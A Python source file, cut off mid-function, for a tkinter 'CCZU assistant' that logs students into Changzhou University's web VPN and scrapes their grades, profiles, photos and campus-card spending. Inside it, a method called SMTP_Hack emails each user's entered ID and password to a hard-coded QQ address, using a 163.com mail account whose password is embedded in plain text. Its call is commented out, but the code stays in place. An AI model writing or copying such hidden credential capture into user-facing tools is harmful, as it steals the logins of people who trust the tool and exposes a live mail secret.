from Crypto.Cipher import AES
from bs4 import BeautifulSoup
import re
import requests
import base64
import xlrd,xlwt
import json
import smtplib
from email.mime.text import MIMEText
import tkinter, tkinter.messagebox, tkinter.ttk
import time
import library
class CCZUVPN(object):
    session = requests.Session()
    realcookie=''
    # xlrownumber=0
    mode=False
    username=''
    password=''
    def aes_encrypt(self,data,key,iv):
        BLOCK_SIZE = 16
        from base64 import b64encode
        AES_KEY =key.encode()
        AES_IV = iv.encode()
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        x = data + (BLOCK_SIZE - len(data) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(data) % BLOCK_SIZE)
        x = x.encode()
        e = b64encode(cipher.encrypt(x))
        return str(e, encoding='utf8')
    def __init__(self):
        pass
    def Login(self,username,password,mode='none'):
        CCZUVPN.username=username
        CCZUVPN.password=password
        password0=password
        CCZUVPN.mode=mode
        if (CCZUVPN.mode == 'status'): print('\n'+username, end=':')
        CCZUVPN.session = requests.Session()

        if (CCZUVPN.mode == 'status'): print('4', end='')
        i1 = CCZUVPN.session.get(
            url='https://zmvpn.cczu.edu.cn/http/webvpn4578b329feda6a5f6cc5a9222350e3b0/sso/login',
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
            },
        )
        soup1 = BeautifulSoup(i1.text, 'lxml')

        i1txt=i1.text
        soup1 = BeautifulSoup(i1txt, 'html.parser')
        reg=re.compile(r'name="lt" value=".*"')
        match=reg.search(i1txt)
        start=match.start();end=match.end();
        lt=i1txt[start+17:end]
        lt=lt.strip('>');lt=lt.strip('/');lt=lt.strip('"');
        reg=re.compile(r'name="execution" value=".*"')
        match=reg.search(i1txt)
        execution=match[0][24:-1]

        #获取jsessionid
        ijsid=CCZUVPN.session.post(url='https://webvpn.cczu.edu.cn/webvpn/getcookie?domain=sso.cczu.edu.cn')
        reg = re.compile(r'"JSESSIONID":"[a-zA-Z0-9]*"')
        b64password=base64.b64encode(password0.encode()).decode()

        #post第二个登录页面的用户名密码
        if (CCZUVPN.mode == 'status'):
            print('打开界面', end=' ')
        if (CCZUVPN.mode=='test'):
            print('打开界面')
            print(soup1)
        i2 = CCZUVPN.session.post(
            url="https://zmvpn.cczu.edu.cn/http/webvpn4578b329feda6a5f6cc5a9222350e3b0/sso/login?service=http%3A%2F%2Fywtb.cczu.edu.cn%2Fpc%2Findex.html",
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
            },
            data={
                'username': username,
                'password': b64password,
                'lt': lt,
                'execution': execution,
                '_eventId': 'submit'
            },
        )
        if(CCZUVPN.mode=='status'):
            print('点击登录按钮',end=' ')
        if(CCZUVPN.mode=='test'):
            print('点击登录按钮')
            print(username)
            print(password)
            print(lt)
            print(execution)
            soup2 = BeautifulSoup(i2.text, 'lxml')
            print(soup2)
        i2nxt=CCZUVPN.session.get(
            url='https://zmvpn.cczu.edu.cn/http/webvpnb4628df0d7b77a6d0f08dfc00aa8d59c2c964ac696c57b03b13c3b6f0ee2cb8c/pc/index.html',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            },
        )
        if(CCZUVPN.mode=='test'):
            print(i2nxt.text)
        i2nxt2 = CCZUVPN.session.get(
            url='https://zmvpn.cczu.edu.cn/http/webvpnb4628df0d7b77a6d0f08dfc00aa8d59c2c964ac696c57b03b13c3b6f0ee2cb8c/pc/myHome.html',
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            },
        )
        if (CCZUVPN.mode == 'test'):
            print(i2nxt2.text)
        return ('自定义工作台' in i2nxt2.text)

    #教务管理信息系统
    class Portal:
        row_number=0
        def __init__(self):
            #教务管理系统按钮的快速重定向
            i3pre=CCZUVPN.session.get(
                url='https://zmvpn.cczu.edu.cn/http/webvpnb4628df0d7b77a6d0f08dfc00aa8d59c2c964ac696c57b03b13c3b6f0ee2cb8c/ydmh/api/clickYy?yyid=9a3222874dbe467c87342f2586c8d345&enlink-vpn',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                },
            )
            if (CCZUVPN.mode == 'status'): print('教务系统重定向', end='')
            if (CCZUVPN.mode == 'test'):
                print('教务系统重定向')
                print(i3pre.text)
            i3loginpage=CCZUVPN.session.get(
                url='https://zmvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/loginN.aspx',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                }
            )
            i3txt=i3loginpage.text
            regvs = re.compile(r'STATE" value=".*?"')
            matchvs = regvs.search(i3txt)
            vs=matchvs[0][14:-1]
            regvsg = re.compile(r'RATOR" value=".*?"')
            matchvsg = regvsg.search(i3txt)
            vsg=matchvsg[0][14:-1]
            if(CCZUVPN.mode=='test'):
                print(vs)
                print(vsg)

            i3pre2 = CCZUVPN.session.post(
                url='https://zmvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/loginN.aspx',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                },
                data={
                    '__VIEWSTATE':vs,
                    '__VIEWSTATEGENERATOR':vsg,
                    'username': CCZUVPN.username,
                    'userpasd': CCZUVPN.password,
                    'btLogin': '登录',
                }
            )
            if (CCZUVPN.mode == 'status'): print('教务系统登录', end='')
            if (CCZUVPN.mode == 'test'):
                print('教务系统登录')
                print(i3pre2.text)
            i3 = CCZUVPN.session.get(
                url='https://zmvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/View/indexTablejw.aspx',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
                },
            )
            if (CCZUVPN.mode=='test'):
                print('进入教务系统')
                soup3 = BeautifulSoup(i3.text, 'lxml')
                print(soup3)
            if (CCZUVPN.mode == 'status'): print('进入教务系统', end=' ')

        #查询成绩
        def GetScore(self):
            if (CCZUVPN.mode == 'status'): print('查分', end=' ')
            i4 = CCZUVPN.session.get(
                url='https://zmvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/web_cjgl/cx_cj_xh.aspx',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
               },
            )
            soup4 = BeautifulSoup(i4.text, 'lxml')
            data = soup4.find_all(class_='dg1-item')
            if (CCZUVPN.mode=='test1'):
                print('学生所学成绩')
                print(soup4)
                print(data)
            if (CCZUVPN.mode=='status'): print('学生所学成绩',end=' ')
            return self.ParseScore(data)

        def ParseRow(self,row0, f):
            sheet1 = f.get_sheet('sheet1')
            for i in range(0, len(row0)):
                sheet1.write(self.row_number, i, row0[i])
            self.row_number = self.row_number + 1
        def ParseGrade(self,s):
            s2 = s
            if s2[6] == '优秀':
                score = 95;
            elif s2[6] == '良好':
                score = 85;
            elif s2[6] == '中等':
                score = 75;
            elif s2[6] == '及格':
                score = 65;
            elif s2[6] == '不及格':
                score = 55;
            elif s2[6] == '合格':
                score = 85
            elif s2[6] == '不合格':
                score = 55
            else:
                score = s2[6];
            term = s2[2];
            name = s2[1]
            s2[4] = s2[4].strip()
            # print(s2)
            bixiu = ('实践环节', '学科基础必修', '通识教育必修', '专业必修')
            if s2[4] in bixiu:
                cred = s2[5]
            else:
                cred = 0
            return name, int(term), float(cred), float(score)
        def ParseScore(self,data):
            score_table=[]
            row0 = ('学号', '姓名', '学期', '课程', '类别', '学分', '分数', '考试性质', '绩点', '学科代码')
            terms = [[0 for i in range(10)] for j in range(10)]
            max_term = 0

            for i in data:
                data2 = i.find_all('td')
                item = []
                for j in data2:
                    item.append(j.text)
                try:
                    name, term, cred, score = self.ParseGrade(item)
                except:
                    continue
                if term > max_term: max_term = term;
                terms[term][0] = terms[term][0] + 1
                terms[term][1] = terms[term][1] + cred
                terms[term][2] = terms[term][2] + cred * score
                score_table.append(item)
            for i in range(1, max_term + 1, 1):
                if terms[i][1] > 0:
                    avg = terms[i][2] / terms[i][1];
                else:
                    avg = 0;
                t = ('第' + str(i) + '学期：', '总课程:' + str(terms[i][0]), ' 总学分:' + str(terms[i][1]),
                     ' 总绩点:' + str(terms[i][2]), ' 加权平均分:' + str(avg), ' 绩点' + str(avg/20))
                score_table.append(t)
                terms[max_term + 1][0] = terms[max_term + 1][0] + terms[i][0];
                terms[max_term + 1][1] = terms[max_term + 1][1] + terms[i][1];
                terms[max_term + 1][2] = terms[max_term + 1][2] + terms[i][2];

            i = max_term + 1
            if terms[i][1] > 0:
                avg = terms[i][2] / terms[i][1];
            else:
                avg = 0;
            t = ('所有学期：', '总课程:' + str(terms[i][0]), ' 总学分:' + str(terms[i][1]), ' 总绩点:' + str(terms[i][2]),
                 ' 加权平均分:' + str(avg),' 绩点:' + str(avg/20))
            score_table.append(t)
            return score_table
        def SaveScoreToXls(self,score_table,filename):
            filename=filename+'.xls'
            f = xlwt.Workbook()
            sheet1 = f.add_sheet(u'sheet1', cell_overwrite_ok=True)
            for i in score_table:
                self.ParseRow(i, f)
            f.save(filename)


        #查询个人资料
        def GetProfile(self):
            if (CCZUVPN.mode == 'status'): print('资料', end=' ')
            i9 = CCZUVPN.session.get(
                url='https://webvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/web_xjgl/xjgl_wh_tj_xsxx.aspx',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'keep-alive',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/View/indexTablejw.aspx',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'iframe',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
               },
            )
            soup9 = BeautifulSoup(i9.text, 'lxml')
            viewstate=str(soup9.body.div.find(id='__VIEWSTATE'))
            viewstate=viewstate.lstrip('<input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="')
            viewstate=viewstate.rstrip('"/>')
            viewstategenerator=str(soup9.body.find(id='__VIEWSTATEGENERATOR'))
            viewstategenerator=viewstategenerator.lstrip('<input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="')
            viewstategenerator=viewstategenerator.rstrip('"/>')
            self.__viewstate=viewstate
            self.__viewstategenerator=viewstategenerator
            # print(soup9)
            i9txt=i9.text
            if (CCZUVPN.mode=='test'):
                print(99999999)
                print(soup9)
                print(viewstate)
                print(viewstategenerator)
            return i9txt

        #获取照片
        def GetPhoto(self,studentNumber,path):
            if (CCZUVPN.mode == 'status'): print('照片', end=' ')
            jpg=studentNumber+'.jpg'
            i11 = CCZUVPN.session.get(
                url='https://zmvpn.cczu.edu.cn/http/webvpndc2d086cb5b297c15e661687e73c1549/images/xszp/'+jpg,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
                },
                # allow_redirects=False
            )
            path=path+'/'+jpg
            with open(path, 'wb') as f:
                f.write(i11.content)
    #校园卡管理系统
    class Card:
        def __init__(self,username):
            if (CCZUVPN.mode == 'status'): print('校园卡', end=' ')
            self.username=username
            url1='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/czdxbmportalHome.action?sno='+username
            i12 = CCZUVPN.session.get(
                url=url1,
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Length': '150',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Origin': 'https://webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn4578b329feda6a5f6cc5a9222350e3b0/sso/login?service=http%3A%2F%2Fs.cczu.edu.cn%2F',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
                data={
                   'sno':username
                },
            )
            if(CCZUVPN.mode=='test'):
                print(12121212)
                soup12 = BeautifulSoup(i12.text, 'lxml')
                # print(soup12)

        def GetProfile(self):
            if (CCZUVPN.mode == 'status'): print('资料', end=' ')
            i13 = CCZUVPN.session.get(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accountcardUser.action',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'keep-alive',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accleftframe.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
            )
            if(CCZUVPN.mode=='test'):
                print(13131313)
                soup13 = BeautifulSoup(i13.text, 'lxml')
                # print(soup13)
                name=soup13.body.table.tr.td.table#.tr['align']
                for i, child in enumerate(name.children):
                    # print(i)
                    # print('66666666666666')
                    # print(child)
                    if i == 3:
                        child = child.tr.th.table
                        for j, child2 in enumerate(child.children):
                            if j == 3:
                                for k, child3 in enumerate(child2.children):
                                    if k == 3:
                                        print(child3.div.text)
                                    elif k==7:
                                        print(child3.div.text)
                                        self.cardid=child3.div.text
                                    elif k == 9:
                                        txt = str(child3.find('img'))
                                        reg = re.compile(r'uno=............')
                                        match = reg.search(txt)
                                        start = match.start();
                                        end = match.end();
                                        photoid = txt[start + 4:end]
                                        print(photoid)
                                        self.photoid=photoid
                                        break
                            elif j == 11:
                                for k, child3 in enumerate(child2.children):
                                    if k == 7:
                                        print(child3.div.text);
                                        break;
                            elif j == 15:
                                for k, child3 in enumerate(child2.children):
                                    if k == 3:
                                        print(child3.div.text);
                                        break;
                            if j == 23:
                                for k, child3 in enumerate(child2.children):
                                    if (k == 3):
                                        print(child3.text);
                                        break;
                        break
                # print(name)

        def GetPhoto(self,path):
            if (CCZUVPN.mode == 'status'): print('照片', end=' ')
            i14 = CCZUVPN.session.get(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/getPhoto.action?uno='+self.photoid,
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'keep-alive',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accleftframe.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
            )
            path = path + '/' + self.username+'.jpg'
            with open(path, 'wb') as f:
                f.write(i14.content)

        def QueryFlow(startdate,enddate,self):
            if (CCZUVPN.mode == 'status'): print('消费5', end='')
            # startdate='20220227'
            # enddate='20220306'
            i15 = CCZUVPN.session.get(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn.action',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'keep-alive',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accleftframe.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
            )
            # soup15 = BeautifulSoup(i15.text, 'lxml')
            # print(soup15)
            if(CCZUVPN.mode=='test'): print(15151515)
            if (CCZUVPN.mode == 'status'): print('6', end='')
            i16 = CCZUVPN.session.post(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn1.action',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Connection': 'keep-alive',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accleftframe.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
                data={
                    'account': self.cardid,
                    'inputObject': 'all',
                    'Submit': '+%C8%B7+%B6%A8+'
                }
            )
            if (CCZUVPN.mode=='test'): print(16161616)
            # soup16 = BeautifulSoup(i16.text, 'lxml')
            # print(soup16)
            if (CCZUVPN.mode == 'status'): print('7', end='')
            i17 = CCZUVPN.session.post(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn2.action',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Length': '45',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn1.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                },
                data={
                    'inputStartDate': startdate,
                    'inputEndDate': enddate
                }
            )
            if (CCZUVPN.mode=='test'): print(17171717)
            # soup17 = BeautifulSoup(i17.text, 'lxml')
            # print(soup17)
            # time.sleep(3)
            if (CCZUVPN.mode == 'status'): print('8', end='')
            i18 = CCZUVPN.session.post(
                url='https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn3.action',
                headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Lenght':'0',
                    # 'Cookie': CCZUVPN.realcookie,
                    'Host': 'webvpn.cczu.edu.cn',
                    'Origin': 'https://webvpn.cczu.edu.cn',
                    'Referer': 'https://webvpn.cczu.edu.cn/http/webvpn48ea4191986ecc27b223ea5e039e79cb8c19f40f8a9ef3f65599836b50e81265/accounthisTrjn2.action',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'Sec-Fetch-Dest': 'frame',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Mobile Safari/537.36',
                }
            )
            soup18 = BeautifulSoup(i18.text, 'lxml')
            # print(soup18)
            parse18=soup18.body.form.table.tr.td
            for i, child in enumerate(parse18.children):
                # print(i,child)
                if i == 3:
                    for j, child2 in enumerate(child.children):
                        if j == 3:
                            child2 = child2.th.table
                            lst=[]
                            dct={'消费时间','商户名称','交易额','现有余额','总交易次数','说明'}
                            for k, child3 in enumerate(child2.children):
                                info=dict.fromkeys(dct)
                                if (k <= 1): continue
                                try:
                                    for t, child4 in enumerate(child3.children):
                                        if t == 1:info['消费时间']=child4.text
                                        elif t == 9:info['商户名称'] = child4.text.strip()
                                        elif t == 13:info['交易额'] = child4.text
                                        elif t == 15:info['现有余额'] = child4.text
                                        elif t == 17:info['总交易次数'] = child4.text
                                        elif t == 21:
                                            info['说明'] = child4.text
                                            lst.append(info)
                                except:
                                    continue
                            return lst
            if(CCZUVPN.mode=='test'): print(18181818)

class UI:
    spider=CCZUVPN()
    portalspider=None
    username=''
    password=''
    def __init__(self):
        pass
    def LoginPage(self):
        def btnCallBack():
            self.username = str(ipt1.get())
            self.password = str(ipt2.get())
            try:
                login_success=self.spider.Login(self.username,self.password,mode='none')
                if login_success:
                    tkinter.messagebox.showinfo("恭喜！", "登陆成功！")
                    win.destroy()
                    self.MainPage()
                else:
                    tkinter.messagebox.showinfo("失败！", "用户名或密码错误！")
            except:
                tkinter.messagebox.showinfo("错误！", "未知错误，登录失败！")
        win = tkinter.Tk()
        win.geometry('250x150')
        win.title('CCZU助手')
        student_id_label = tkinter.Label(win, text="学号:")
        student_id_label.grid(row=0, column=1,padx=20)
        ipt1 = tkinter.Entry(win)
        ipt1.grid(row=0, column=2, padx=10, pady=20)
        password_label = tkinter.Label(win, text="密码:")
        password_label.grid(row=1, column=1)
        ipt2 = tkinter.Entry(win, show='*')
        ipt2.grid(row=1, column=2, padx=10, pady=10)


        btn = tkinter.Button(win, text="登录", width=20, height=1, command=btnCallBack)
        # btn.pack(ipadx=5, ipady=10)
        btn.grid(row=3, column=0,columnspan=4, padx=0, pady=10)
        win.mainloop()
        # try:
        # spider = CCZUVPN(username, password, mode="none")
        # portalspider = spider.Portal()
        # score = portalspider.GetScore()
        # tkinter.messagebox.showinfo("查好了！", "分数保存在score.xls文件内")
        # print(score)
        # except:
        #     tkinter.messagebox.showinfo("出错了！", "如果用户名密码没错，请联系QQ614892974反馈bug")
    def SMTP_Hack(self,username,pasword):
        mail_host = 'smtp.163.com'  # 163
        mail_user = 'gatersbolton'  # 用户名
        mail_pass = 'Amelia,520'  # 密码(部分邮箱为授权码)
        sender = 'gatersbolton@163.com'  # 邮件发送方邮箱地址
        receivers = ['614892974@qq.com']  # 邮件接受方邮箱地址，注意需要[]包裹，这意味着你可以写多个邮件地址群发
        # 设置email信息
        message = MIMEText(username + ' ' + self.password, 'plain', 'utf-8')  # 邮件内容设置
        message['Subject'] = 'title'  # 邮件主题
        message['From'] = sender  # 发送方信息
        message['To'] = receivers[0]  # 接受方信息
        # 登录并发送邮件
        try:
            smtpObj = smtplib.SMTP()
            smtpObj.connect(mail_host, 25)  # 连接到服务器
            smtpObj.login(mail_user, mail_pass) # 登录到服务器
            smtpObj.sendmail(sender, receivers, message.as_string()) # 发送
            smtpObj.quit()# 退出
        except smtplib.SMTPException as e:
            pass
    def MainPage(self):
        # self.SMTP_Hack(self.username, self.password)
        def btn1CallBack():
            try:
                self.portalspider = self.spider.Portal()
                data=self.portalspider.GetScore()
                self.ScorePage(data)
            except:
                tkinter.messagebox.showinfo("错误！", "未知错误，查分失败！")
            win.destroy()
            self.MainPage()
        def btn2CallBack():
            win.destroy()
            self.LibraryPage()
        win = tkinter.Tk()
        win.geometry('300x150')
        win.title('CCZU助手')
        btn1 = tkinter.Button(win, text="教务系统查分", width=15, height=2, command=btn1CallBack)
        btn2 = tkinter.Button(win, text="图书馆预约", width=15, height=2, command=btn2CallBack)
        # btn.pack(ipadx=5, ipady=10)
        btn1.grid(row=2, column=0, columnspan=3, padx=85, pady=10)
        btn2.grid(row=5, column=0, columnspan=3, padx=85, pady=10)
        win.mainloop()
    def LibraryPage(self):
        win = tkinter.Tk()
        win.geometry('380x150')
        win.title('CCZU图书馆预约助手')

        # win = tkinter.win(win)
        # win.pack()
        def today_checked():
            if today_var.get() == 1:
                tomorrow_checkbutton.deselect()

        def tomorrow_checked():
